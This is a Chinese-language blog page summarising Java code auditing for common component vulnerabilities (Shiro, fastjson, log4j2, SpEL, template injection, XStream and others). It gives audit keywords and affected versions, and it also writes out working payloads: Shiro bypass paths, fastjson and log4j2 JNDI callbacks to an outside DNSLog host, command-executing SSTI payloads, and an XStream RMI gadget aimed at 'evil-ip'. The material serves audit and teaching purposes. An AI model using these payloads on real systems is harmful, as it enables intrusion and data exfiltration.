@@ -1,0 +1,563 @@
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>代码审计总结 | 养猪日记</title>
+<meta name=keywords content><meta name=description content='前言
+Java安全是一个比较庞大的东西，单论Java代码审计所需要的知识点其实较为简单，Java安全研究会比较深入，其实可以这两者可以较为明显的区分开来，一个为了业务服务，一个为了深入挖掘。单论安全服务以及渗透测试的程度，业务层面的Java代码审计足以。如果是要深入研究的话，愚见认为，不同的岗位决定对知识的掌握深度，当前岗位如果有深入需求再考虑。以下文章内容仅从快速完成代码审计的视角出发，不涉及深入的漏洞研究。
+常见组件漏洞
+1、Shiro
+shiro的漏洞主要是两个，一个是硬编码，一个是权限绕过：
+硬编码：
+硬编码漏洞大家都知道问题出在rememberMe功能上，对于shiro而言，配置rememberMe的方法大致如下：
+securityManager.setRememberMeManager(rememberMeManager());//设置rememberMeManager()
+
+关键词：setRememberMeManager
+
+具体实现：
+public CookieRememberMeManager rememberMeManager()  
+{  
+    CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();  
+    cookieRememberMeManager.setCookie(rememberMeCookie());  
+    cookieRememberMeManager.setCipherKey(Base64.decode("fCq+/xW488hMTCD+cmJ3aQ=="));  
+    return cookieRememberMeManager;  
+}
+
+搜索密钥关键词：setCipherKey
+
+shiro还可以通过配置文件的方式进行配置，同样可以搜索关键词：
+org.apache.shiro.web.mgt.DefaultWebSecurityManager
+org.apache.shiro.web.mgt.CookieRememberMeManager
+案例：
+
+
+
+
+
+
+
+
+权限绕过：
+
+  
+      
+          CVE
+          描述
+          影响范围
+          payload
+      
+  
+  
+      
+          CVE-2020-1957
+          权限绕过
+          Shiro < 1.5.2
+          /xxx/..;/admin/
+      
+      
+          CVE-2020-11989
+          CVE-2020-1957补丁绕过
+          Shiro < 1.5.3
+          /;/admin/page
+      
+      
+          CVE-2020-13933
+          CVE-2020-11989补丁绕过
+          Shiro < 1.6.0
+          /admin/%3bpage
+      
+      
+          CVE-2020-17523
+          权限绕过
+          Shiro < 1.7.1
+          /admin/%20  /admin/%2e
+      
+      
+          shiro配置路径匿名访问的方法大概如下：
+          
+          
+          
+      
+  
+
+1、集中配置'><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">代码审计总结</h1><div class=post-meta><span title='2024-12-19 14:25:59 +0800 CST'>December 19, 2024</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;938 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#1shiro>1、Shiro</a><ul><li><a href=#硬编码>硬编码：</a></li><li><a href=#权限绕过>权限绕过：</a></li></ul></li><li><a href=#2fastjson>2、fastjson</a></li><li><a href=#3log4j2>3、log4j2</a></li><li><a href=#4spel>4、SpEL</a></li><li><a href=#5模板注入>5、模板注入</a><ul><li><a href=#freemarker>Freemarker：</a></li><li><a href=#thymeleaf>Thymeleaf</a></li><li><a href=#velocity>Velocity</a></li></ul></li><li><a href=#6其他>6、其他</a><ul><li><a href=#xstream>XStream</a></li><li><a href=#dubbo>Dubbo</a></li><li><a href=#druid>druid</a></li><li><a href=#spring-boot-actuator>Spring boot Actuator</a></li><li><a href=#swagger>Swagger</a></li><li><a href=#apache-activemq>Apache ActiveMQ</a></li><li><a href=#zookeeper>Zookeeper</a></li><li><a href=#不安全的反射>不安全的反射</a></li></ul></li></ul><ul><li><a href=#1sql注入>1、SQL注入</a></li><li><a href=#2xss>2、XSS</a></li><li><a href=#3文件上传>3、文件上传</a></li><li><a href=#4任意文件下载>4、任意文件下载</a></li><li><a href=#5ssrfcsrf>5、SSRF&amp;CSRF</a></li><li><a href=#6url重定向>6、URL重定向</a></li><li><a href=#7逻辑漏洞>7、逻辑漏洞</a><ul><li><a href=#权限问题>权限问题</a></li><li><a href=#支付问题>支付问题</a></li><li><a href=#密码问题>密码问题</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h1 id=前言>前言<a hidden class=anchor aria-hidden=true href=#前言>#</a></h1><p>Java安全是一个比较庞大的东西，单论Java代码审计所需要的知识点其实较为简单，Java安全研究会比较深入，其实可以这两者可以较为明显的区分开来，一个为了业务服务，一个为了深入挖掘。单论安全服务以及渗透测试的程度，业务层面的Java代码审计足以。如果是要深入研究的话，愚见认为，不同的岗位决定对知识的掌握深度，当前岗位如果有深入需求再考虑。以下文章内容仅从快速完成代码审计的视角出发，不涉及深入的漏洞研究。</p><h1 id=常见组件漏洞>常见组件漏洞<a hidden class=anchor aria-hidden=true href=#常见组件漏洞>#</a></h1><h2 id=1shiro>1、Shiro<a hidden class=anchor aria-hidden=true href=#1shiro>#</a></h2><p>shiro的漏洞主要是两个，一个是硬编码，一个是权限绕过：</p><h3 id=硬编码>硬编码：<a hidden class=anchor aria-hidden=true href=#硬编码>#</a></h3><p>硬编码漏洞大家都知道问题出在rememberMe功能上，对于shiro而言，配置rememberMe的方法大致如下：</p><pre tabindex=0><code>securityManager.setRememberMeManager(rememberMeManager());//设置rememberMeManager()
+
+关键词：setRememberMeManager
+
+具体实现：
+public CookieRememberMeManager rememberMeManager()  
+{  
+    CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();  
+    cookieRememberMeManager.setCookie(rememberMeCookie());  
+    cookieRememberMeManager.setCipherKey(Base64.decode(&#34;fCq+/xW488hMTCD+cmJ3aQ==&#34;));  
+    return cookieRememberMeManager;  
+}
+
+搜索密钥关键词：setCipherKey
+
+shiro还可以通过配置文件的方式进行配置，同样可以搜索关键词：
+org.apache.shiro.web.mgt.DefaultWebSecurityManager
+org.apache.shiro.web.mgt.CookieRememberMeManager
+</code></pre><p>案例：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241210212625.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241210212644.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241210212700.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241210212952.png alt></p><h3 id=权限绕过>权限绕过：<a hidden class=anchor aria-hidden=true href=#权限绕过>#</a></h3><table><thead><tr><th style=text-align:left>CVE</th><th style=text-align:left>描述</th><th style=text-align:left>影响范围</th><th style=text-align:left>payload</th></tr></thead><tbody><tr><td style=text-align:left>CVE-2020-1957</td><td style=text-align:left>权限绕过</td><td style=text-align:left>Shiro &lt; 1.5.2</td><td style=text-align:left>/xxx/..;/admin/</td></tr><tr><td style=text-align:left>CVE-2020-11989</td><td style=text-align:left>CVE-2020-1957补丁绕过</td><td style=text-align:left>Shiro &lt; 1.5.3</td><td style=text-align:left>/;/admin/page</td></tr><tr><td style=text-align:left>CVE-2020-13933</td><td style=text-align:left>CVE-2020-11989补丁绕过</td><td style=text-align:left>Shiro &lt; 1.6.0</td><td style=text-align:left>/admin/%3bpage</td></tr><tr><td style=text-align:left>CVE-2020-17523</td><td style=text-align:left>权限绕过</td><td style=text-align:left>Shiro &lt; 1.7.1</td><td style=text-align:left>/admin/%20 /admin/%2e</td></tr><tr><td style=text-align:left>shiro配置路径匿名访问的方法大概如下：</td><td style=text-align:left></td><td style=text-align:left></td><td style=text-align:left></td></tr></tbody></table><p>1、集中配置</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241210213452.png alt></p><pre tabindex=0><code>通过定义Shiro的ShiroFilterFactoryBean，可以设置具体的URL路径与对应的过滤器链：
+关键词shiroFilterFactoryBean
+</code></pre><p>2、注解</p><pre tabindex=0><code>@RequiresRoles、@RequiresPermissions
+
+例如：
+@RequiresRoles(&#34;admin&#34;)
+public void someMethod() {
+    // 方法内容
+}
+</code></pre><p>案例：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241210213741.png alt>
+<img loading=lazy src=/dmsj_img/Pasted%20image%2020241210215227.png alt>
+<img loading=lazy src=/dmsj_img/Pasted%20image%2020241210215157.png alt></p><h2 id=2fastjson>2、fastjson<a hidden class=anchor aria-hidden=true href=#2fastjson>#</a></h2><p>安全版本>1.2.83</p><p>fastjson的触发点较为单一，关键词：JSON.parseObject、JSON.parse，只要相关参数用户可控即可。</p><p>一些知识点：jdni注入，rmi要求JDK8版本低于8u121，ldap要求低于8u191，当然存在一些高版本jdk的利用姿势，不过代码审计的情况下可以尽量便利一些。</p><p>由于fastjson采用的黑名单修复，很多类不一定能加载，以下dnslong仅限于证明参数用户可控，具体能否漏洞利用成功受限于具体的fastjson版本以及jdk版本。</p><pre tabindex=0><code>{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://8157cfb94b.ipv6.1433.eu.org&#34;}
+{{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://8157cfb94b.ipv6.1433.eu.org&#34;}:&#34;x&#34;}
+{&#34;@type&#34;:&#34;java.net.InetAddress&#34;,&#34;val&#34;:&#34;dnslog&#34;}
+{&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;dnslog&#34;}
+{&#34;@type&#34;:&#34;java.net.Inet6Address&#34;,&#34;val&#34;:&#34;dnslog&#34;}
+{{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;dnslog&#34;}:&#34;aaa&#34;}
+{&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;, {&#34;@type&#34;: &#34;java.net.URL&#34;, &#34;val&#34;:&#34;http://dnslog&#34;}}&#34;&#34;}
+Set[{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}]
+Set[{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}
+{&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;:&#34;dnslog&#34;}}
+{{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}:0
+</code></pre><p>案例：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241210223032.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241210223001.png alt>
+这个参数非常清晰：
+<img loading=lazy src=/dmsj_img/Pasted%20image%2020241210223409.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241210224920.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241210224936.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241210225915.png alt></p><h2 id=3log4j2>3、log4j2<a hidden class=anchor aria-hidden=true href=#3log4j2>#</a></h2><p>Apache Log4j 2.x &lt;= 2.15.0-rc1</p><p>log4j2的触发点审计需要知道一些前提知识点：</p><pre tabindex=0><code>log4j的日志记录具有等级划分：
+ALL &lt; TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF
+默认情况下只会记录大于WARN等级的日志，也就是说默认情况下，我们的审计关键词为logger.error和logger.fatal
+
+但是也有修改等级的方法，审计的时候需要注意：
+
+1、通过编程方式设置
+import org.apache.logging.log4j.Level
+logger.setLevel(Level.DEBUG); // 设置日志等级为 DEBUG
+
+2、XML 配置文件
+    &lt;Loggers&gt;
+        &lt;Root level=&#34;debug&#34;&gt;
+            &lt;AppenderRef ref=&#34;Console&#34;/&gt;
+        &lt;/Root&gt;
+    &lt;/Loggers&gt;
+
+3、 JSON 配置文件
+ &#34;Loggers&#34;: {
+      &#34;Root&#34;: {
+        &#34;level&#34;: &#34;debug&#34;,
+        
+4、 YAML 配置文件
+  Loggers:
+    Root:
+      level: debug
+
+根据配置文件，可以确定审计的关键词为：logger.TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL
+</code></pre><p>payload：</p><pre tabindex=0><code>${jndi:ldap://${env:OS}.61169aeb6f.ipv6.1433.eu.org}
+</code></pre><p>案例：</p><p>所有的日志都将生效：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241211153441.png alt></p><p>寻找可控点：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241211153559.png alt></p><p>这里是一个获取上传文件名的地方，参数可控：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241211153808.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241211154252.png alt>
+<img loading=lazy src=/dmsj_img/Pasted%20image%2020241211154345.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241211154747.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241211154801.png alt></p><h2 id=4spel>4、SpEL<a hidden class=anchor aria-hidden=true href=#4spel>#</a></h2><p>SpEL表达式注入，这个漏洞其实在网站开发者中的自编码中并不常见，更多是在spring家族的一些组件里面，这个简单来说就是将用户的输入带入SpEL表达式中执行了：</p><p>单独代码审计关键词：</p><pre tabindex=0><code>//关键类  
+org.springframework.expression.Expression  
+org.springframework.expression.ExpressionParser  
+org.springframework.expression.spel.standard.SpelExpressionParser  
+  
+//调用特征  
+ExpressionParser parser = new SpelExpressionParser();  
+Expression expression = parser.parseExpression(str);  
+expression.getValue()  
+expression.setValue()
+
+黑盒一般使用一些数字${3333-1}
+</code></pre><p>一些著名的SpEL注入组件：</p><pre tabindex=0><code>CVE-2016-4977 黑盒有概率遇到
+Spring Security OAuth 2.3到2.3.2
+Spring Security OAuth 2.2到2.2.1
+Spring Security OAuth 2.1到2.1.1
+Spring Security OAuth 2.0到2.0.14
+
+CVE-2017-4971
+Pivotal Spring_Web_Flow 2.4.0到2.4.4
+
+CVE-2017-8046
+Pivotal_Software Spring_Data_Rest &lt; 2.6.9
+VMware Spring_Boot 2.0.0
+VMware Spring_Boot &lt; 1.5.9
+Pivotal_Software Spring_Data_Rest 3.0.0
+
+CVE-2018-1270
+Spring Framework 5.0 to 5.0.4.
+Spring Framework 4.3 to 4.3.14
+
+CVE-2018-1273
+Spring Data Commons 1.13至1.13.10
+Spring Data REST 2.6至2.6.10
+Spring Data Commons 2.0至2.0.5
+Spring Data REST 3.0至3.0.5
+
+CVE-2022-22947 黑盒有大概率遇到
+Spring Cloud Gateway 3.1.0至3.1.1和3.0.0至3.0.6
+
+
+CVE-2022-22963 黑盒有大概率遇到
+org.springframework.cloud:spring-cloud-function-context
+（影响版本：3.0.0.RELEASE~3.2.2）
+
+CVE-2022-22965 这个不是SpEL表达式注入，但是影响范围比较大，作为审计来说有必要进行查看，黑盒有概率遇到
+Spring Framework 5.3.X &lt; 5.3.18 
+Spring Framework 5.2.X &lt; 5.2.20
+及其衍生产品
+JDK ≥ 9
+</code></pre><p>上诉漏洞部分在黑盒中并不好使，容易被发现的以进行了备注，利用详情可查看另外一个文章，不容易被黑盒发现的作为审计来说也应该注意规避风险。</p><h2 id=5模板注入>5、模板注入<a hidden class=anchor aria-hidden=true href=#5模板注入>#</a></h2><p>JAVA中比较严重的SSTI模板注入主要发生在三个组件上：Freemarker、Velocity、Thymeleaf，因为它们允许直接调用底层 Java 方法：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241220153128.png alt></p><h3 id=freemarker>Freemarker：<a hidden class=anchor aria-hidden=true href=#freemarker>#</a></h3><pre tabindex=0><code>Freemarker的漏洞在于用户可以修改模板，修改模板的方法目前有三个：一是通过stringLoader.putTemplate方法来把模板加载到内存中，二个是通过实例化Template类，三是通过其他方法直接修改对应的模板文件，在实战中多见于参数直接传递，或者直接修改模板文件。
+
+审计正则表达式：
+html可换成ftl
+return\(.*?\.html
+return\s*&#34;.*?\.html&#34;
+render\(.*?\.html
+
+当一个Controller的方法没有返回值（即返回类型为`void`），并且使用了`@GetMapping`或`@PostMapping`等注解来处理HTTP请求时，Spring MVC会默认将请求的URL作为视图名称，并使用配置的模板引擎（如Thymeleaf）去渲染对应的模板。
+审计正则表达式：
+@GetMapping\(.*?\)\s*public\s+void/gm
+
+payload:
+
+new函数：
+&lt;#assign value=&#34;freemarker.template.utility.Execute&#34;?new()&gt;${value(&#34;calc.exe&#34;)}
+
+&lt;#assign value=&#34;freemarker.template.utility.ObjectConstructor&#34;?new()&gt;${value(&#34;java.lang.ProcessBuilder&#34;,&#34;calc.exe&#34;).start()}
+
+&lt;#assign value=&#34;freemarker.template.utility.JythonRuntime&#34;?new()&gt;&lt;@value&gt;import os;os.system(&#34;calc.exe&#34;)
+
+api函数：
+#assign classLoader=object?api.class.protectionDomain.classLoader&gt; 
+&lt;#assign clazz=classLoader.loadClass(&#34;ClassExposingGSON&#34;)&gt; 
+&lt;#assign field=clazz?api.getField(&#34;GSON&#34;)&gt; 
+&lt;#assign gson=field?api.get(null)&gt; 
+&lt;#assign ex=gson?api.fromJson(&#34;{}&#34;, classLoader.loadClass(&#34;freemarker.template.utility.Execute&#34;))&gt; 
+${ex(&#34;Calc&#34;&#34;)}
+
+其中api的方法在2.3.22版本之后默认无法使用，new方法在2.3.30版本后也被做了一些限制，无法直接执行命令，但是仍然需要注意，所以建议至少版本在2.3.30版本后，同时无危险使用方法。
+</code></pre><p>案例参考：
+<a href=https://github.com/pawelkaliniakit/springboot-freemarker-ssti/tree/master>https://github.com/pawelkaliniakit/springboot-freemarker-ssti/tree/master</a>
+<a href=https://github.com/nth347/Java-SSTI-demo>https://github.com/nth347/Java-SSTI-demo</a></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241222001709.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241222001831.png alt></p><h3 id=thymeleaf>Thymeleaf<a hidden class=anchor aria-hidden=true href=#thymeleaf>#</a></h3><pre tabindex=0><code>比较常规的漏洞版本是：Thymeleaf 3.0.0 至 3.0.11，但是后续的漏洞版本修复存在一些绕过问题，建议至少大于3.0.15。
+
+和上一个模板注入的情况类似，我认为最常见的情况还是return或者render返回对应的前端文件。
+
+审计正则表达式：
+html可换成ftl
+return\(.*?\.html
+return\s*&#34;.*?\.html&#34;
+render\(.*?\.html
+
+当一个Controller的方法没有返回值（即返回类型为`void`），并且使用了`@GetMapping`或`@PostMapping`等注解来处理HTTP请求时，Spring MVC会默认将请求的URL作为视图名称，并使用配置的模板引擎（如Thymeleaf）去渲染对应的模板。
+审计正则表达式：
+@GetMapping\(.*?\)\s*public\s+void/gm
+
+payload:
+
+__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27calc.exe%27).getInputStream()).next()%7d__::.x
+</code></pre><h3 id=velocity>Velocity<a hidden class=anchor aria-hidden=true href=#velocity>#</a></h3><pre tabindex=0><code>安全版本：Velocity大于2.2
+
+重点关注：
+org.apache.velocity.app.Velocity 的 evaluate 和 mergeTemplate 方法
+org.apache.velocity.app.VelocityEngine 的 evaluate 和 mergeTemplate 方法
+org.apache.velocity.runtime.RuntimeServices 的 evaluate 和 parse 方法
+org.apache.velocity.runtime.RuntimeSingleton 的 parse 方法
+org.apache.velocity.runtime.resource.util.StringResourceRepository 的 putStringResource 方法
+
+payload:
+#set ($exec = &#34;kxlzx&#34;)$exec.class.forName(&#34;java.lang.Runtime&#34;).getRuntime().exec(&#34;calc&#34;)
+
+%23set($e=&#34;e&#34;);$e.getClass().forName(&#34;java.lang.Runtime&#34;).getMethod(&#34;getRuntime&#34;,null).invoke(null,null).exec(&#34;calc&#34;)
+</code></pre><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241224151127.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241224151144.png alt></p><h2 id=6其他>6、其他<a hidden class=anchor aria-hidden=true href=#6其他>#</a></h2><h3 id=xstream>XStream<a hidden class=anchor aria-hidden=true href=#xstream>#</a></h3><pre tabindex=0><code>&lt;= 1.4.16
+
+这个组件是用来解析xml文件的，可以理解为将xml文件反序列化为对象，和fastjson很像，在反序列化时会调用对象的readObject方法，找到合适的链子即可RCE，目前使用的较多的是JDNI的那条，审计关键词：
+XStream.fromXML()
+</code></pre><p>poc，修改evil-ip：</p><pre tabindex=0><code>java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &#34;whoami&#34;  //无回显哦，直接打，修改payload直接看看监听也可
+
+
+&lt;java.util.PriorityQueue serialization=&#39;custom&#39;&gt;
+    &lt;unserializable-parents/&gt;
+    &lt;java.util.PriorityQueue&gt;
+        &lt;default&gt;
+            &lt;size&gt;2&lt;/size&gt;
+        &lt;/default&gt;
+        &lt;int&gt;3&lt;/int&gt;
+        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+            &lt;type&gt;12345&lt;/type&gt;
+            &lt;value class=&#39;com.sun.org.apache.xpath.internal.objects.XString&#39;&gt;
+                &lt;m__obj class=&#39;string&#39;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;
+            &lt;/value&gt;
+        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+            &lt;type&gt;12345&lt;/type&gt;
+            &lt;value class=&#39;com.sun.xml.internal.ws.api.message.Packet&#39; serialization=&#39;custom&#39;&gt;
+                &lt;message class=&#39;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#39;&gt;
+                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;
+                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;
+                    &lt;bodyParts/&gt;
+                    &lt;sm class=&#39;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#39;&gt;
+                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;
+                        &lt;nullIter class=&#39;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#39;&gt;
+                            &lt;aliases class=&#39;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#39;&gt;
+                                &lt;candidates class=&#39;com.sun.jndi.rmi.registry.BindingEnumeration&#39;&gt;
+                                    &lt;names&gt;
+                                        &lt;string&gt;aa&lt;/string&gt;
+                                        &lt;string&gt;aa&lt;/string&gt;
+                                    &lt;/names&gt;
+                                    &lt;ctx&gt;
+                                        &lt;environment/&gt;
+                                        &lt;registry class=&#39;sun.rmi.registry.RegistryImpl_Stub&#39; serialization=&#39;custom&#39;&gt;
+                                            &lt;java.rmi.server.RemoteObject&gt;
+                                                &lt;string&gt;UnicastRef&lt;/string&gt;
+                                                &lt;string&gt;evil-ip&lt;/string&gt;
+                                                &lt;int&gt;1099&lt;/int&gt;
+                                                &lt;long&gt;0&lt;/long&gt;
+                                                &lt;int&gt;0&lt;/int&gt;
+                                                &lt;long&gt;0&lt;/long&gt;
+                                                &lt;short&gt;0&lt;/short&gt;
+                                                &lt;boolean&gt;false&lt;/boolean&gt;
+                                            &lt;/java.rmi.server.RemoteObject&gt;
+                                        &lt;/registry&gt;
+                                        &lt;host&gt;evil-ip&lt;/host&gt;
+                                        &lt;port&gt;1099&lt;/port&gt;
+                                    &lt;/ctx&gt;
+                                &lt;/candidates&gt;
+                            &lt;/aliases&gt;
+                        &lt;/nullIter&gt;
+                    &lt;/sm&gt;
+                &lt;/message&gt;
+            &lt;/value&gt;
+        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &lt;/java.util.PriorityQueue&gt;
+&lt;/java.util.PriorityQueue&gt;
+</code></pre><h3 id=dubbo>Dubbo<a hidden class=anchor aria-hidden=true href=#dubbo>#</a></h3><pre tabindex=0><code>Dubbo CVE-2019-17564
+
+该漏洞最后触发点在readObject()
+
+2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4
+2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7
+Apache Dubbo = 2.5.x
+
+&lt;properties&gt;
+    &lt;dubbo.version&gt;2.7.5&lt;/dubbo.version&gt;
+&lt;/properties&gt;
+
+&lt;dependencies&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;
+        &lt;artifactId&gt;dubbo&lt;/artifactId&gt;
+      &lt;version&gt;${dubbo.version}&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;
+      &lt;artifactId&gt;dubbo-dependencies-zookeeper&lt;/artifactId&gt;
+        &lt;version&gt;${dubbo.version}&lt;/version&gt;
+      &lt;type&gt;pom&lt;/type&gt;
+    &lt;/dependency&gt;
+&lt;/dependencies&gt;
+</code></pre><h3 id=druid>druid<a hidden class=anchor aria-hidden=true href=#druid>#</a></h3><pre tabindex=0><code>这个组件在黑盒中十分常见，存在未授权的情况大概如下：
+druid的配置文件一般是Spring Boot 的 application.yml 或 application.properties
+stat-view-servlet配置关键词：
+   enabled：是否启用 Druid 监控页面。
+   login-username：监控页面登录账号。
+   login-password：监控页面登录密码。
+   reset-enable：是否允许重置统计数据。
+
+一般来说只要是enabled: true就是有相关页面的，但是是否存在未授权还要看整个系统的访问控制以及是否配置了一些访问限制
+</code></pre><p>案例：</p><p>这里是配置了相关路径的：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241212221854.png alt></p><p>但是直接访问不行，会被shiro的权限控制给拦截，在shiro中添加匿名访问路径：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241212222515.png alt>
+就会有匿名访问了：
+<img loading=lazy src=/dmsj_img/Pasted%20image%2020241212222525.png alt></p><h3 id=spring-boot-actuator>Spring boot Actuator<a hidden class=anchor aria-hidden=true href=#spring-boot-actuator>#</a></h3><p>Spring Boot Actuator 是 Spring Boot 提供的一个监控和管理工具，它提供了一系列的Endpoints，允许开发者访问应用程序的运行时信息，如健康检查、环境属性、度量指标等，这是个未授权访问，在黑盒测试中也是常客，多次headump敏感信息泄露拿下站点：</p><pre tabindex=0><code>相关组件：
